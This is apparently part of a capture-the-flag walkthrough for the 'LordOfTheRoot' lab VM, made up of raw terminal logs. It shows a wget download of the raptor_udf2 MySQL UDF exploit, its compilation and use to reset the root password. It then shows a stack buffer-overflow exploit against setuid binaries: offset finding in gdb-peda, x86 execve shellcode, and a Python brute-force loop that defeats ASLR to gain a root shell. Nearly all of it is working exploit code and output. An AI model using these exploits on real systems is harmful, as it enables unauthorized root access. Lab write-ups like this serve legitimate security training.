+--2015-12-01 10:49:54--  http://0xdeadbeef.info/exploits/raptor_udf2.c
+Resolving 0xdeadbeef.info (0xdeadbeef.info)... 213.254.16.4
+Connecting to 0xdeadbeef.info (0xdeadbeef.info)|213.254.16.4|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3178 (3.1K) [text/x-csrc]
+Saving to: ‘raptor_udf2.c’
+
+100%[=========================================================================================================================================================================>] 3,178       --.-K/s   in 0.02s   
+
+2015-12-01 10:49:55 (153 KB/s) - ‘raptor_udf2.c’ saved [3178/3178]
+
+smeagol@LordOfTheRoot:~$ gcc -g -c raptor_udf2.c
+smeagol@LordOfTheRoot:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+smeagol@LordOfTheRoot:~$ mysql -u root
+ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
+smeagol@LordOfTheRoot:~$ mysql -u root -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 4427
+Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> create table foo(line blob);
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
+Query OK, 1 row affected (0.00 sec)
+
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+Query OK, 1 row affected (0.01 sec)
+
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+Query OK, 0 rows affected (0.01 sec)
+
+mysql> select * from mysql.func;
++-----------+-----+----------------+----------+
+| name      | ret | dl             | type     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf2.so | function |
++-----------+-----+----------------+----------+
+1 row in set (0.00 sec)
+
+mysql> select do_system('echo "root:passwd" | chpasswd > /tmp/out; chown smeagol.smeagol /tmp/out');
++---------------------------------------------------------------------------------------+
+| do_system('echo "root:passwd" | chpasswd > /tmp/out; chown smeagol.smeagol /tmp/out') |
++---------------------------------------------------------------------------------------+
+|                                                                                     0 |
++---------------------------------------------------------------------------------------+
+1 row in set (0.03 sec)
+
+mysql> exit
+Bye
+smeagol@LordOfTheRoot:~$ 
+
+11.) Get the flag
+smeagol@LordOfTheRoot:~$ su -
+Password: 
+root@LordOfTheRoot:~# whoami
+root
+root@LordOfTheRoot:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@LordOfTheRoot:~# cd /root/
+root@LordOfTheRoot:~# ls
+buf  buf.c  Flag.txt  other  other.c  switcher.py
+root@LordOfTheRoot:~# cat Flag.txt 
+“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
+– Gandalf
+root@LordOfTheRoot:~# 
+
+Method 2
+root@kali:~# ssh smeagol@192.168.174.128
+
+                                                  .____    _____________________________
+                                                  |    |   \_____  \__    ___/\______   \
+                                                  |    |    /   |   \|    |    |       _/
+                                                  |    |___/    |    \    |    |    |   \
+                                                  |_______ \_______  /____|    |____|_  /
+                                                          \/       \/                 \/
+ ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
+|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
+|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
+|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
+        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
+Easy as 1,2,3
+smeagol@192.168.174.128's password: 
+Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+214 packages can be updated.
+101 updates are security updates.
+
+                            .____    _____________________________                              
+                            |    |   \_____  \__    ___/\______   \                             
+                            |    |    /   |   \|    |    |       _/                             
+                            |    |___/    |    \    |    |    |   \                             
+                            |_______ \_______  /____|    |____|_  /                             
+                                    \/       \/                 \/                              
+ __      __       .__                                ___________      .__                   .___
+/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
+\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ | 
+ \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ | 
+  \__/\  /  \___  >____/\___  >____/|__|_|  /\___  >  \___  /   |__|  |__|\___  >___|  /\____ | 
+       \/       \/          \/            \/     \/       \/                  \/     \/      \/ 
+Last login: Tue Dec  1 10:45:41 2015 from 192.168.174.137
+smeagol@LordOfTheRoot:~$ cd /SECRET/
+smeagol@LordOfTheRoot:/SECRET$ ls
+door1  door2  door3
+smeagol@LordOfTheRoot:/SECRET$ ls -lah *
+door1:
+total 16K
+drwxr-xr-x 2 root root 4.0K Dec  2 07:15 .
+drwxr-xr-x 5 root root 4.0K Sep 22 13:01 ..
+-rwsr-xr-x 1 root root 7.2K Sep 17 23:08 file
+
+door2:
+total 16K
+drwxr-xr-x 2 root root 4.0K Dec  2 07:15 .
+drwxr-xr-x 5 root root 4.0K Sep 22 13:01 ..
+-rwsr-xr-x 1 root root 7.2K Sep 17 23:08 file
+
+door3:
+total 16K
+drwxr-xr-x 2 root root 4.0K Dec  2 07:15 .
+drwxr-xr-x 5 root root 4.0K Sep 22 13:01 ..
+-rwsr-xr-x 1 root root 5.1K Sep 22 13:01 file
+smeagol@LordOfTheRoot:/SECRET$ 
+smeagol@LordOfTheRoot:/SECRET$ cd door1/
+smeagol@LordOfTheRoot:/SECRET/door1$ ./file $(python -c 'print "A"*500')
+Segmentation fault (core dumped)
+smeagol@LordOfTheRoot:/SECRET/door1$ cd ..
+smeagol@LordOfTheRoot:/SECRET$ cd door2/
+smeagol@LordOfTheRoot:/SECRET/door2$ ./file $(python -c 'print "A"*500')
+smeagol@LordOfTheRoot:/SECRET/door2$ cd ..
+smeagol@LordOfTheRoot:/SECRET$ cd door3/
+smeagol@LordOfTheRoot:/SECRET/door3$ ./file $(python -c 'print "A"*500')
+smeagol@LordOfTheRoot:/SECRET/door3$ cd ..
+smeagol@LordOfTheRoot:/SECRET$ cd door1/
+smeagol@LordOfTheRoot:/SECRET/door1$ cp file ../../tmp/
+smeagol@LordOfTheRoot:/SECRET/door1$ cd /tmp/
+smeagol@LordOfTheRoot:/tmp$ ls
+file
+smeagol@LordOfTheRoot:/tmp$ ./file $(python -c 'print "A"*500')
+Segmentation fault (core dumped)
+smeagol@LordOfTheRoot:/tmp$ file file 
+file: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=9e50c7cacaf5cc2c78214c81f110c88e61ad0c10, not stripped
+smeagol@LordOfTheRoot:/tmp$
+smeagol@LordOfTheRoot:/tmp$ nano exploit.py
+smeagol@LordOfTheRoot:/tmp$ cat exploit.py 
+import os
+exploit = "A"*500
+
+os.system("./file "+ exploit)
+#os.system("gdb --args file "+exploit)
+smeagol@LordOfTheRoot:/tmp$ git clone https://github.com/longld/peda.git /opt/peda
+fatal: could not create work tree dir '/opt/peda'.: Permission denied
+smeagol@LordOfTheRoot:/tmp$ git clone https://github.com/longld/peda.git ~/peda
+Cloning into '/home/smeagol/peda'...
+remote: Counting objects: 276, done.
+remote: Total 276 (delta 0), reused 0 (delta 0), pack-reused 276
+Receiving objects: 100% (276/276), 263.20 KiB | 113.00 KiB/s, done.
+Resolving deltas: 100% (170/170), done.
+Checking connectivity... done.
+smeagol@LordOfTheRoot:/tmp$ echo "source ~/peda/peda.py" >> ~/.gdbinit
+smeagol@LordOfTheRoot:/tmp$ 
+smeagol@LordOfTheRoot:/tmp$ gdb ./file -q
+Reading symbols from ./file...(no debugging symbols found)...done.
+gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : disabled
+gdb-peda$ pattern_create 500
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%ZA%vA%wA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfA'
+gdb-peda$ pset arg 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%ZA%vA%wA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfA'
+gdb-peda$ pshow arg
+arg[1]: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%ZA%vA%wA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfA
+gdb-peda$ run
+Starting program: /tmp/file 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%ZA%vA%wA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfA'
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0xb7fc0000 --> 0x1a9da8 
+ECX: 0xbffff8c0 ("4AsJAsfA")
+EDX: 0xbffff63d ("4AsJAsfA")
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0x41415641 ('AVAA')
+ESP: 0xbffff500 ("AAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%"...)
+EIP: 0x57414172 ('rAAW')
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x57414172
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff500 ("AAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%"...)
+0004| 0xbffff504 ("AXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%r"...)
+0008| 0xbffff508 ("tAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA"...)
+0012| 0xbffff50c ("AAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%"...)
+0016| 0xbffff510 ("AZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%t"...)
+0020| 0xbffff514 ("vAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA"...)
+0024| 0xbffff518 ("AAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%"...)
+0028| 0xbffff51c ("AyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%ZA%v"...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x57414172 in ?? ()
+gdb-peda$ pattern_search 
+Registers contain pattern buffer:
+EIP+0 found at offset: 171
+EBP+0 found at offset: 167
+Registers point to pattern buffer:
+[ESP] --> offset 4 - size ~203
+[EDX] --> offset 492 - size ~8
+[ECX] --> offset 492 - size ~8
+Pattern buffer found at:
+0xbffff451 : offset    0 - size  500 ($sp + -0xaf [-44 dwords])
+0xbffff6d4 : offset    0 - size  500 ($sp + 0x1d4 [117 dwords])
+References to pattern buffer found at:
+0xbffff430 : 0xbffff451 ($sp + -0xd0 [-52 dwords])
+0xbffff440 : 0xbffff451 ($sp + -0xc0 [-48 dwords])
+0xbffff444 : 0xbffff6d4 ($sp + -0xbc [-47 dwords])
+gdb-peda$ 
+
+smeagol@LordOfTheRoot:/tmp$ cat exploit.py 
+import os
+#exploit = "A"*500
+exploit = "A"*171 + "B"*4 + "x90"*8 + "C"*(500-171-8-4)
+
+#os.system("./file "+ exploit)
+os.system("gdb --args file "+exploit)
+smeagol@LordOfTheRoot:/tmp$ 
+
+smeagol@LordOfTheRoot:/tmp$ python exploit.py 
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from file...(no debugging symbols found)...done.
+gdb-peda$ run
+Starting program: /tmp/file AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBx90x90x90x90x90x90x90x90CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0xb7fc0000 --> 0x1a9da8 
+ECX: 0xbffff8c0 ("CCCCC")
+EDX: 0xbffff640 ("CCCCC")
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0x41414141 ('AAAA')
+ESP: 0xbffff4f0 ("x90x90x90x90x90x90x90x90", 'C' <repeats 176 times>...)
+EIP: 0x42424242 ('BBBB')
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x42424242
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff4f0 ("x90x90x90x90x90x90x90x90", 'C' <repeats 176 times>...)
+0004| 0xbffff4f4 ("90x90x90x90x90x90x90", 'C' <repeats 180 times>...)
+0008| 0xbffff4f8 ("0x90x90x90x90x90", 'C' <repeats 184 times>...)
+0012| 0xbffff4fc ("x90x90x90x90", 'C' <repeats 188 times>...)
+0016| 0xbffff500 ("90x90x90", 'C' <repeats 192 times>...)
+0020| 0xbffff504 ("0x90", 'C' <repeats 196 times>...)
+0024| 0xbffff508 ('C' <repeats 200 times>...)
+0028| 0xbffff50c ('C' <repeats 200 times>...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+gdb-peda$ 
+gdb-peda$ shellcode generate x86/linux exec
+# x86/linux/exec: 24 bytes
+shellcode = (
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
+    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
+)
+gdb-peda$ 
+
+ASLR is enabled
+smeagol@LordOfTheRoot:/tmp$ cat /proc/sys/kernel/randomize_va_space 
+2
+smeagol@LordOfTheRoot:/tmp$
+
+gdb-peda$ jmpcall esp libc
+0xb7e18a85 : jmp esp
+0xb7efe1cd : jmp esp
+0xb7f69e00 : call esp
+0xb7f70bb7 : call esp
+0xb7f70c37 : call esp
+0xb7f70d37 : call esp
+0xb7f70db7 : call esp
+0xb7f70e37 : call esp
+0xb7f71b37 : call esp
+0xb7f72dc3 : call esp
+0xb7f72f83 : jmp esp
+0xb7f7fb93 : jmp esp
+0xb7f7fba7 : call esp
+0xb7f7fbbb : jmp esp
+0xb7f7fe03 : call esp
+0xb7f7fe2b : jmp esp
+0xb7f7fe3b : jmp esp
+0xb7f80083 : jmp esp
+0xb7f80097 : call esp
+0xb7f80307 : jmp esp
+0xb7f8031b : call esp
+0xb7f8032f : call esp
+0xb7f804ab : jmp esp
+0xb7f804af : call esp
+0xb7f80533 : jmp esp
+
+smeagol@LordOfTheRoot:/tmp$ cat exploit.py 
+import os, sys
+files= ["/SECRET/door1/file","/SECRET/door2/file","/SECRET/door3/file"]
+#exploit = "A"*500
+#exploit = "A"*171 + "B"*4 + "x90"*8 + "C"*(500-171-4-8)
+
+shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
+#exploit = "A"*171 + "B"*4 + "x90"*16 + shell + "C"*(500-171-4-16-len(shell))
+
+exploit = "A"*171 + "\x31\x0e\xcc\xbf" + "\x90"*20480 +shell
+
+#If Segfault, retry or shell
+while True:
+	fileSize=[]
+	for f in files:
+		fileSize.append(os.path.getsize(f))
+	index = fileSize.index(min(fileSize))
+	os.system(files[index]+" "+exploit)
+
+#os.system("./file "+ exploit)
+#os.system("gdb --args file "+exploit)
+smeagol@LordOfTheRoot:/tmp$ 
+
+smeagol@LordOfTheRoot:/tmp$ python exploit.py 
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+# id
+uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)
+# cat /root/Flag.txt
+“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
+– Gandalf
+# 
